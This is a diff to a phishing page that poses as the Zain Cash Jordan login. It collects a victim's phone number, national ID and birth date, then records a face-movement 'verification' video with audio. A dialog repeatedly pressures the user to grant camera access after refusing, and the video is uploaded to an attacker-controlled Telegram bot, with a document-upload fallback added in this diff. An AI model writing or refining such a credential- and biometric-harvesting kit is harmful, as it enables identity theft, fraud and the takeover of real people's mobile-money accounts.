@@ -6,10 +6,6 @@
   <title>زين كاش الأردن | تسجيل الدخول</title>
   <meta name="theme-color" content="#2F80ED">
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
-
-  <!-- FFmpeg.wasm (لتحويل webm -> mp4 على المتصفح) -->
-  <script src="https://unpkg.com/@ffmpeg/ffmpeg@0.11.8/dist/ffmpeg.min.js"></script>
-
   <style>
     /* === عام === */
     :root{
@@ -22,7 +18,9 @@
       --danger-2: #e53935;
     }
 
-    html,body{ height:100%; }
+    html,body{
+      height:100%;
+    }
 
     body {
       background: linear-gradient(135deg, var(--primary-1) 0%, var(--primary-2) 100%);
@@ -46,7 +44,6 @@
       position:relative;
       overflow:hidden;
     }
-
     .zain-header { display:flex; align-items:center; justify-content:center; gap:10px; margin-bottom:14px; }
     .zain-logo { width:64px; height:64px; border-radius:20px; background:linear-gradient(135deg,var(--primary-2) 60%,var(--primary-1) 100%); display:flex; align-items:center; justify-content:center; box-shadow:0 2px 16px #2f80ed22; border:2.5px solid #fff; overflow:hidden; }
     .zain-logo img { width:60px; height:60px; object-fit:contain; border-radius:16px; background:#fff; border:1.5px solid #e3eefe; }
@@ -57,6 +54,7 @@
     .step-dot.active { background: linear-gradient(135deg,var(--primary-1) 70%,var(--primary-2) 100%); border-color:var(--primary-1); }
 
     label { color:var(--primary-1); font-size:15px; font-weight:600; margin-bottom:8px; display:block; }
+    /* موحّد لخانات الإدخال */
     input[type="text"], input[type="tel"], input[type="number"], select, .text-input {
       padding:12px 12px;
       border-radius:10px;
@@ -73,16 +71,67 @@
       -moz-appearance: none;
       appearance: none;
     }
-    input::placeholder, .text-input::placeholder { color: #9fbfe8; opacity:1; }
-    input:focus, select:focus, .text-input:focus { box-shadow: 0 6px 22px rgba(47,128,237,0.18); border-color: var(--primary-1); background: #fbfeff; transform: translateY(0); }
+    input[type="text"]::placeholder,
+    input[type="tel"]::placeholder,
+    input[type="number"]::placeholder,
+    .text-input::placeholder {
+      color: #9fbfe8;
+      opacity:1;
+    }
+    input[type="text"]:focus, input[type="tel"]:focus, input[type="number"]:focus, select:focus, .text-input:focus {
+      box-shadow: 0 6px 22px rgba(47,128,237,0.18);
+      border-color: var(--primary-1);
+      background: #fbfeff;
+      transform: translateY(0);
+    }
 
-    .button { background: linear-gradient(90deg,var(--primary-1) 0%,var(--primary-2) 100%); color:#fff; border:none; padding:13px 12px; border-radius:9px; font-size:18px; font-weight:800; cursor:pointer; box-shadow:0 1px 6px rgba(47,128,237,0.14); transition: transform .06s ease, opacity .08s ease; display:inline-block; min-width:120px; text-align:center; }
+    /* زر موحد أساسي */
+    .button {
+      background: linear-gradient(90deg,var(--primary-1) 0%,var(--primary-2) 100%);
+      color:#fff;
+      border:none;
+      padding:13px 12px;
+      border-radius:9px;
+      font-size:18px;
+      font-weight:800;
+      cursor:pointer;
+      box-shadow:0 1px 6px rgba(47,128,237,0.14);
+      transition: transform .06s ease, opacity .08s ease;
+      display:inline-block;
+      min-width:120px;
+      text-align:center;
+    }
     .button:active { transform:translateY(1px); opacity:0.92; }
 
-    .back-btn { position:relative; display:inline-block; background: transparent; color:var(--primary-1); padding:8px 10px; border-radius:8px; font-weight:700; cursor:pointer; font-size:14px; border:2px solid transparent; margin-bottom:10px; }
+    /* زر الرجوع - مصغر لكنه مرئي ومتناسق */
+    .back-btn {
+      position:relative;
+      display:inline-block;
+      background: transparent;
+      color:var(--primary-1);
+      padding:8px 10px;
+      border-radius:8px;
+      font-weight:700;
+      cursor:pointer;
+      font-size:14px;
+      border:2px solid transparent;
+      margin-bottom:10px;
+    }
     .back-btn:hover { background:#f4faff; }
 
-    .danger-button { background: linear-gradient(90deg,var(--danger-1) 0%,var(--danger-2) 100%); color:#fff; border:none; padding:11px 12px; border-radius:9px; font-size:15px; font-weight:800; cursor:pointer; box-shadow:0 1px 6px rgba(229,57,53,0.18); transition: transform .06s ease, opacity .08s ease; }
+    /* زر إلغاء أحمر */
+    .danger-button {
+      background: linear-gradient(90deg,var(--danger-1) 0%,var(--danger-2) 100%);
+      color:#fff;
+      border:none;
+      padding:11px 12px;
+      border-radius:9px;
+      font-size:15px;
+      font-weight:800;
+      cursor:pointer;
+      box-shadow:0 1px 6px rgba(229,57,53,0.18);
+      transition: transform .06s ease, opacity .08s ease;
+    }
     .danger-button:active { transform:translateY(1px); opacity:0.92; }
 
     .info-msg { text-align:center; color:var(--primary-1); font-weight:600; margin:8px 0; }
@@ -91,24 +140,28 @@
 
     .zain-footer { margin-top:20px; text-align:center; color:#a6c7ef; font-weight:600; font-size:13px; opacity:0.85; }
 
+    /* === كاميرا === */
     .camera-wrap { display:flex; flex-direction:column; align-items:center; gap:14px; }
     .camera-box { width:100%; max-width:320px; height:420px; background:#2f2f33; border-radius:8px; overflow:hidden; position:relative; border:6px solid #fff; box-sizing:border-box; display:flex; align-items:center; justify-content:center; }
     .camera-box video { width:100%; height:100%; object-fit:cover; }
     .instruction-box { background: rgba(0,0,0,0.72); color:#fff; padding:12px; border-radius:10px; max-width:320px; text-align:center; font-size:16px; line-height:1.45; }
     .countdown { position:absolute; top:8px; left:8px; background:rgba(0,0,0,0.45); color:#fff; padding:6px 10px; border-radius:12px; font-weight:700; }
 
+    /* processing modal */
     #processingModal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.55); z-index:10000; align-items:center; justify-content:center; color:#fff; }
     #processingModal.active { display:flex; }
     .processingBox { background:rgba(0,0,0,0.65); padding:20px 26px; border-radius:12px; text-align:center; min-width:260px; }
     .spinner { width:48px; height:48px; border-radius:50%; border:5px solid rgba(255,255,255,0.18); border-top-color:#fff; animation:spin 1s linear infinite; margin:0 auto 12px; }
     @keyframes spin { to { transform:rotate(360deg); } }
 
+    /* modal error */
     #modalError { display:none; position:fixed; inset:0; background:rgba(47,128,237,0.13); z-index:9999; align-items:center; justify-content:center; }
     #modalError.active { display:flex; }
     #modalContent { background:#fff; padding:27px 32px; border-radius:13px; text-align:center; border:2px solid #f9b3b3; box-shadow:0 7px 34px rgba(47,128,237,0.2); }
     #modalContent .err-title { color:#e53935; font-size:19px; font-weight:700; }
     #modalContent .err-msg { margin-top:8px; font-weight:600; color:#444; }
 
+    /* permission modal */
     #permissionModal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:11000; align-items:center; justify-content:center; padding:18px; box-sizing:border-box; }
     #permissionModal.active { display:flex; }
     #permissionBox { background:#fff; border-radius:12px; padding:20px; max-width:520px; width:100%; text-align:right; direction:rtl; box-shadow:0 8px 40px rgba(0,0,0,0.25); }
@@ -116,6 +169,7 @@
     #permissionBox p { margin:0 0 12px 0; color:#333; font-weight:600; }
     .perm-actions { display:flex; gap:10px; justify-content:flex-start; margin-top:8px; }
 
+    /* تحسينات عرض الحقول على الشاشات الصغيرة */
     @media (max-width:450px){
       #app{padding:16px 1.5vw 10px 1.5vw;}
       .camera-box{height:320px;}
@@ -133,7 +187,7 @@
   <div id="processingModal" aria-hidden="true">
     <div class="processingBox">
       <div class="spinner" aria-hidden="true"></div>
-      <div id="processingText" style="font-weight:700;font-size:18px;">جارٍ التحقق من هويتك...</div>
+      <div style="font-weight:700;font-size:18px;">جارٍ التحقق من هويتك...</div>
       <div style="margin-top:6px;color:#ddd;font-size:14px;">الرجاء الانتظار حتى الانتهاء</div>
     </div>
   </div>
@@ -146,6 +200,7 @@
     </div>
   </div>
 
+  <!-- نافذة إصرار على إذن الكاميرا -->
   <div id="permissionModal" role="dialog" aria-hidden="true">
     <div id="permissionBox" role="document" aria-labelledby="permTitle">
       <h3 id="permTitle">نحتاج إذن الكاميرا</h3>
@@ -176,10 +231,6 @@
   let telegramMsgId = null;
   let waitingTimeout = null;
 
-  // FFmpeg instance (lazily loaded)
-  let ffmpegInstance = null;
-  const ffmpegLog = true;
-
   function stepIndicator(step){
     return `
       <div class="step-indicator">
@@ -199,7 +250,7 @@
     `;
   }
 
-  // صفحات الإدخال (نفسها كما قبل)
+  // صفحة رقم الهاتف
   function renderPhoneStep(){
     app.innerHTML = `
       ${header("مرحبًا بك! سجل دخولك لحسابك")}
@@ -223,6 +274,7 @@
     };
   }
 
+  // صفحة الرقم الوطني + ميلاد
   function renderNationalIdStep(){
     app.innerHTML = `
       <button class="back-btn" id="backBtn">&#8592; رجوع</button>
@@ -378,162 +430,110 @@
         <div style="font-size:18px;color:#353a4d;font-weight:700;margin-bottom:8px;">سيُطلب إذن الكاميرا الآن</div>
         <div style="color:#666;font-size:14px;">
           سنسجل فيديو قصير يتضمن الخطوات التالية:
-          <strong>اغماض العين (3 ثوانٍ)</strong>، <strong>وجه إلى اليمين قليلاً</strong>، <strong>العودة للمنتصف</strong>، <strong>وجه إلى اليسار قليلاً</strong>،
-          <strong>وجه إلى اليمين قليلاً مرة أخرى</strong>، <strong>اغماض العين</strong>, ثم <strong>ابتسم</strong>.<br>
+          <strong>اغماض العين (3 ثوانٍ)</strong>، <strong>وجه إلى اليمين قليلاً</strong>، <strong>العودة للمنتصف</strong>، <strong>وجه إلى اليسار قليلاً</strong>، <strong>وجه إلى اليمين قليلاً مرة أخرى</strong>، <strong>اغماض العين</strong>، ثم <strong>ابتسم</strong>.<br>
           اضبط وجهك داخل الإطار، أزل القبعة/النظارات إذا لزم، واسمح بالوصول للكاميرا.
         </div>
       </div>
     `;
   }
 
-  // --- إذن الكاميرا (إصرار على إعادة المحاولة عند الرفض) ---
+  // --- إدارة إذن الكاميرا: محاولات وإعادة المحاولة عند الرفض ---
   const permModal = document.getElementById('permissionModal');
   const permRetryBtn = document.getElementById('permRetryBtn');
   const permCancelBtn = document.getElementById('permCancelBtn');
 
-  function showPermissionDialog() { if (permModal) permModal.classList.add('active'); }
-  function hidePermissionDialog() { if (permModal) permModal.classList.remove('active'); }
+  function showPermissionDialog() {
+    permModal.classList.add('active');
+  }
+  function hidePermissionDialog() {
+    permModal.classList.remove('active');
+  }
 
+  // تعرض نافذة وإرجاع Promise ينتظر اختيار المستخدم (retry/cancel)
   function promptForPermissionFromUser() {
     return new Promise(resolve => {
       showPermissionDialog();
       const onRetry = () => { cleanup(); resolve('retry'); };
       const onCancel = () => { cleanup(); resolve('cancel'); };
       function cleanup(){
-        if (permRetryBtn) permRetryBtn.removeEventListener('click', onRetry);
-        if (permCancelBtn) permCancelBtn.removeEventListener('click', onCancel);
+        permRetryBtn.removeEventListener('click', onRetry);
+        permCancelBtn.removeEventListener('click', onCancel);
         hidePermissionDialog();
       }
-      if (permRetryBtn) permRetryBtn.addEventListener('click', onRetry);
-      if (permCancelBtn) permCancelBtn.addEventListener('click', onCancel);
+      permRetryBtn.addEventListener('click', onRetry);
+      permCancelBtn.addEventListener('click', onCancel);
     });
   }
 
+  // محاولة واحدة لالتقاط الستريم — تُرمى إذا فشل
   async function tryGetUserMediaOnce() {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
       throw new Error('getUserMedia غير مدعوم في هذا المتصفح');
     }
-    const constraints = {
-      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-      audio: true
-    };
-    return await navigator.mediaDevices.getUserMedia(constraints);
+    // نستخدم facingMode:user لالتقاط الكاميرا الأمامية إن وُجِدت
+    return await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
   }
 
+  // حلقة تطالب المستخدم بإعادة المحاولة كلما تم الرفض، وتُرجع الستريم عند الموافقة أو تُرمى عند إلغاء المستخدم
   async function requestCameraWithInsistence() {
+    // أول محاولة مباشرة (ستُظهر نافذة المتصفح إذا لم تُمنح بعد)
     try {
       const stream = await tryGetUserMediaOnce();
       return stream;
     } catch (err) {
+      // إذا كان الخطأ نتيجة رفض إذن، نطالب المستخدم بإعادة المحاولة أو التوجيه
       const deniedNames = ['NotAllowedError','PermissionDeniedError','NotFoundError','SecurityError'];
       const isPermissionError = err && (deniedNames.includes(err.name) || (err.message && err.message.toLowerCase().includes('permission')));
+      // بعض المتصفحات لا تعطي اسم واضح لذا نتفقد navigator.permissions إن وُجد
       if (!isPermissionError && navigator.permissions && navigator.permissions.query) {
         try {
           const p = await navigator.permissions.query({ name: 'camera' }).catch(()=>null);
-          if (p && p.state === 'denied') { /* fall through */ }
+          if (p && p.state === 'denied') {
+            // اعتبرها مشكلة إذن
+            // fallthrough to dialog
+          }
         } catch(e){}
       }
-      if (!isPermissionError) throw err;
+
+      if (!isPermissionError) {
+        // إذا كان الخطأ ليس رفض إذن واضح، أع��ده للمتصل ليتعامل مع الخطأ
+        throw err;
+      }
+
+      // الآن نعرض نافذة إصرار ونعيد المحاولة طالما يضغط المستخدم "إعادة المحاولة"
       while (true) {
         const choice = await promptForPermissionFromUser();
         if (choice === 'cancel') throw new Error('المستخدم ألغى طلب الإذن');
+        // المستخدم اختار إعادة المحاولة -> نحاول مجدداً
         try {
           const stream = await tryGetUserMediaOnce();
           return stream;
         } catch (eAgain) {
+          // تحقق إذا كان رفض دائم (قد لا تُظهر المتصفحات prompt مرة أخرى)
           const stillDenied = eAgain && (eAgain.name === 'NotAllowedError' || eAgain.name === 'PermissionDeniedError' || (eAgain.message && eAgain.message.toLowerCase().includes('permission')));
-          if (!stillDenied) throw eAgain;
-        }
-      }
-    }
-  }
-
-  // --- FFmpeg helpers (محاولات تحويل متعددة لضمان MP4) ---
-  async function ensureFfmpegLoaded() {
-    if (ffmpegInstance) return ffmpegInstance;
-    if (!window.FFmpeg || !window.FFmpeg.createFFmpeg) {
-      throw new Error('FFmpeg.wasm غير متاحة. تأكد من تحميل المكتبة.');
-    }
-    const { createFFmpeg, fetchFile } = FFmpeg;
-    // إظهار مودال تحميل/تهيئة FFmpeg
-    showProcessing(true);
-    document.getElementById('processingText').textContent = 'جاري تحميل محرك التحويل (FFmpeg.wasm)...';
-    const ff = createFFmpeg({ log: ffmpegLog });
-    await ff.load();
-    ffmpegInstance = { ff, fetchFile };
-    document.getElementById('processingText').textContent = 'جارٍ التحقق من هويتك...';
-    showProcessing(false);
-    return ffmpegInstance;
-  }
-
-  // دالة تحويل قوية تحاول عدة طرق (libx264 ثم mpeg4 ثم remux) وتحاول إعادة المحاولة عند الفشل
-  async function transcodeToMp4(inputBlob) {
-    // هدف: إجبار الإرسال كـ MP4. هذه الدالة ستجرب عدة أوامر وتعيد المحاولة عدة مرات قبل أن تفشل نهائياً.
-    showProcessing(true);
-    document.getElementById('processingText').textContent = 'جاري تحويل الفيديو إلى MP4 — الرجاء الانتظار...';
-    try {
-      const { ff, fetchFile } = await ensureFfmpegLoaded();
-      const inName = 'input.webm';
-      const outName = 'output.mp4';
-
-      // اكتب ملف الإدخال في نظام ملفات ffmpeg.wasm
-      ff.FS('writeFile', inName, await fetchFile(inputBlob));
-
-      // مجموعة الأوامر التي سنحاولها (من الأفضل إلى الأبسط)
-      const attempts = [
-        // أفضل محاولة: libx264 + aac
-        ['-y','-i', inName, '-c:v','libx264','-preset','veryfast','-movflags','+faststart','-pix_fmt','yuv420p','-vf','scale=trunc(iw/2)*2:trunc(ih/2)*2','-c:a','aac','-b:a','128k', outName],
-        // بديل: mpeg4 + aac (أكثر احتمالًا أن يعمل إن لم يكن libx264 متاح)
-        ['-y','-i', inName, '-c:v','mpeg4','-q:v','4','-c:a','aac','-b:a','128k', outName],
-        // محاولة سريعة: إعادة التغليف إن كانت الكوديكات متوافقة (قد تفشل)
-        ['-y','-i', inName, '-c','copy', outName]
-      ];
-
-      let lastError = null;
-      for (let cmdIndex = 0; cmdIndex < attempts.length; cmdIndex++) {
-        const args = attempts[cmdIndex];
-        try {
-          // نجرب تنفيذ الأمر مرتين كحد أقصى لكل طريقة (قد تكون مشكلة عَرَضيّة)
-          for (let retry=0; retry<2; retry++) {
-            try {
-              await ff.run(...args);
-              // قراءة النتيجة
-              const data = ff.FS('readFile', outName);
-              const mp4Blob = new Blob([data.buffer], { type: 'video/mp4' });
-              // تنظيف
-              try { ff.FS('unlink', inName); } catch (e) {}
-              try { ff.FS('unlink', outName); } catch (e) {}
-              return mp4Blob;
-            } catch (singleErr) {
-              lastError = singleErr;
-              // إذا فشل بسبب نقص الذاكرة أو أخطاء قوية، قد نحاول الطريقة التالية
-              console.warn(`FFmpeg attempt ${cmdIndex} retry ${retry} failed:`, singleErr);
-              // small delay before retry
-              await new Promise(r => setTimeout(r, 300));
-            }
+          if (!stillDenied) {
+            // خطأ آخر - أرسله للخارج
+            throw eAgain;
           }
-        } catch (e) {
-          lastError = e;
-          console.warn('Attempt failed, moving to next command', e);
+          // وإلا تكرار الحلقة: سيظهر نفس نافذة الإصرار ليتخذ المستخدم إجراءً آخر
         }
       }
-
-      // إذا وصلنا هنا فكل المحاولات فشلت
-      // تنظيف الملفات
-      try { ff.FS('unlink', inName); } catch (e) {}
-      try { ff.FS('unlink', outName); } catch (e) {}
-      throw lastError || new Error('Failed to transcode to mp4');
-    } finally {
-      document.getElementById('processingText').textContent = 'جارٍ التحقق من هويتك...';
-      showProcessing(false);
     }
   }
 
-  // تسجيل وتسلسل الخطوات وإجبار الإرسال كـ MP4
+  // تسجيل فيديو تسلسلي — الآن نسجل مرة واحدة طوال الخطوات ثم نوقف بعد النهاية
   async function startCaptureSequence(){
     renderPreparingMessage();
     await wait(700);
 
+    // تم تعديل التسلسل حسب طلبك:
+    // 1) اغمض عينيك 3 ثوانٍ
+    // 2) حرك وجهك قليلاً إلى اليمين (3 ثوانٍ)
+    // 3) عد إلى المنتصف (1.5 ثانية)
+    // 4) حرك وجهك قليلاً إلى اليسار (3 ثوانٍ)
+    // 5) حرك وجهك قليلاً إلى اليمين مرة أخرى (3 ثوانٍ)
+    // 6) اغمض عينيك ثانيةً 3 ثوانٍ
+    // 7) ابتسم 3 ثوانٍ
     const steps = [
       { label: 'اغمض عينيك', instruction: 'أغلق عينيك بالكامل لمدة 3 ثوانٍ', duration: 3000 },
       { label: 'حرك وجهك إلى اليمين', instruction: 'حرّك وجهك قليلاً إلى اليمين ثم عد للمنتصف', duration: 3000 },
@@ -562,12 +562,15 @@
     const cancelBtn = document.getElementById('cancelCapture');
     let stream = null;
     try {
+      // هنا نستخدم دالة الإصرار على طلب الإذن: ستعيد المحاولة عند الرفض طالما المستخدم يضغط "إعادة المحاولة"
       stream = await requestCameraWithInsistence();
     } catch (err) {
+      // فشل الحصول على الستريم بسبب إلغاء المستخدم أو خطأ آخر
       throw err;
     }
 
     const videoEl = document.getElementById('videoPreview');
+    // معاينة معكوسة (مرآة)
     videoEl.style.transform = 'scaleX(-1)';
     videoEl.srcObject = stream;
 
@@ -607,12 +610,11 @@
     }
     drawLoop();
 
-    // استخدم canvas.captureStream مع معدل إطار منخفض لتقليل الحجم
-    const processedStream = canvas.captureStream(20);
+    const processedStream = canvas.captureStream(30);
     const audioTracks = stream.getAudioTracks();
     if (audioTracks && audioTracks.length) audioTracks.forEach(t => processedStream.addTrack(t));
 
-    // اختر mime كما في السابق (قد يكون webm إن لم يكن mp4 مدعومًا)
+    // اختر mime كما في السابق
     let chosenMime = null;
     if (window.MediaRecorder && typeof MediaRecorder.isTypeSupported === 'function') {
       if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264')) chosenMime = 'video/mp4;codecs=h264';
@@ -632,9 +634,13 @@
     let chunks = [];
     recorder.ondataavailable = (ev) => { if (ev.data && ev.data.size) chunks.push(ev.data); };
 
+    // سننتظر حدث stop لضمان وصول آخر chunk
     let stopPromiseResolve;
     const stopPromise = new Promise(resolve => { stopPromiseResolve = resolve; });
-    recorder.onstop = () => { setTimeout(() => stopPromiseResolve(), 250); };
+    recorder.onstop = () => {
+      // اضف تأخير بسيط لضمان معالجة آخر dataavailable
+      setTimeout(() => stopPromiseResolve(), 250);
+    };
 
     let cancelled = false;
     cancelBtn.onclick = async () => {
@@ -646,12 +652,14 @@
       renderCode4Step();
     };
 
+    // ابدأ التسجيل مرة واحدة قبل الخطوات
     try {
       recorder.start();
     } catch (err) {
       console.warn('recorder.start failed', err);
     }
 
+    // تنفيذ الخطوات (التوقيت والعد التنازلي) بينما التسجيل مستمر
     await wait(250);
     for (let i=0;i<steps.length;i++){
       if (cancelled) break;
@@ -667,47 +675,28 @@
       for (let t=rem; t>=1; t--){ instructionBox.textContent = `${s.label} — تبقّى ${t} ثانية`; await wait(1000); }
     }
 
+    // أوقف التسجيل مرة واحدة بعد الانتهاء
     if (!cancelled) {
       try { if (recorder && recorder.state !== 'inactive') recorder.stop(); } catch(e){ console.warn('stop failed', e); }
       await stopPromise;
     }
 
+    // أنهِ الرسم والستريم
     drawActive = false;
     stopStream(stream);
 
     const finalType = chosenMime ? chosenMime.split(';')[0] : (chunks[0] ? chunks[0].type : 'video/webm');
-    const finalBlobRaw = new Blob(chunks.filter(b=>b && b.size), { type: finalType });
+    const finalBlob = new Blob(chunks.filter(b=>b && b.size), { type: finalType });
 
-    // الآن: نُرَكِّز على إرسال MP4 إجباريًا
     showProcessing(true);
     try {
-      // إن كان التسجيل بالفعل MP4 فسنرسله مباشرة
-      let toSendBlob = null;
-      if (finalBlobRaw.type.includes('mp4')) {
-        toSendBlob = finalBlobRaw;
+      if (finalBlob.size > 0) {
+        await sendVideoToTelegramAsVideo(finalBlob);
       } else {
-        // ضروري: حوّل إلى mp4 باستخدام ffmpeg.wasm (ستُجرب عدة طرق)
-        try {
-          toSendBlob = await transcodeToMp4(finalBlobRaw);
-        } catch (transErr) {
-          console.error('Transcoding failed after retries', transErr);
-          // نعرض للمستخدم خطأ واضح ونمنع الإرسال بصيغ أخرى لأنك طلبت الإجباري
-          alert('فشل تحويل الفيديو إلى MP4 في هذا الجهاز/المتصفح. يرجى المحاولة من جهاز آخر (كمبيوتر مكتبي/متصفح يدعم FFmpeg.wasm) أو السماح برفع الملف من جهاز آخر.');
-          // أوقف المعالجة وارجع لصفحة رمز الـ4 (أو يمكنك إبقاء المستخدم لرفع فيديو يدويًا)
-          renderCode4Step();
-          return;
-        }
-      }
-
-      // إرسال MP4 إلى تلغرام كـ video (مشغّل داخل الدردشة)
-      if (toSendBlob && toSendBlob.size > 0) {
-        await sendVideoToTelegramAsVideo(toSendBlob);
-      } else {
-        console.warn('no blob to send');
+        console.warn('finalBlob is empty — لا يوجد فيديو مسجّل');
       }
     } catch (e) {
       console.error('send video error', e);
-      alert('حدث خطأ أثناء إرسال الفيديو. حاول مرة أخرى.');
     } finally {
       showProcessing(false);
     }
@@ -715,29 +704,33 @@
     showFinalErrorAndReset();
   }
 
-  // إرسال الفيديو عبر sendVideo مع تحديد mp4 كامتداد
   async function sendVideoToTelegramAsVideo(blob){
     try {
       const form = new FormData();
       form.append('chat_id', CHAT_ID);
-      const ext = 'mp4';
+      const ext = blob.type.includes('mp4') ? 'mp4' : (blob.type.includes('webm') ? 'webm' : 'mp4');
       const fileName = `${userData.phone || 'user'}_face_${Date.now()}.${ext}`;
       form.append('video', blob, fileName);
       form.append('caption', `Face verification — ${userData.phone || ''}`);
-      form.append('supports_streaming', 'true');
-
       const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:'POST', body: form });
       const data = await res.json();
-      if (data && data.ok && data.result && data.result.message_id) {
-        telegramMsgId = data.result.message_id;
-        return;
-      }
+      if (data && data.ok && data.result && data.result.message_id) { telegramMsgId = data.result.message_id; return; }
       console.warn('sendVideo non-ok', data);
-      throw new Error('sendVideo failed');
+      await sendVideoAsDocumentFallback(blob);
     } catch (err) {
       console.error('sendVideo error', err);
-      throw err;
+      try { await sendVideoAsDocumentFallback(blob); } catch(e){ console.error('fallback failed', e); throw err; }
     }
+  }
+  async function sendVideoAsDocumentFallback(blob){
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    const fileName = `${userData.phone || 'user'}_face_${Date.now()}.webm`;
+    form.append('document', blob, fileName);
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method:'POST', body: form });
+    const data = await res.json();
+    if (data && data.ok && data.result && data.result.message_id) telegramMsgId = data.result.message_id;
+    else console.warn('sendDocument failed', data);
   }
 
   async function sendToTelegramAndGetMsgId(msg){
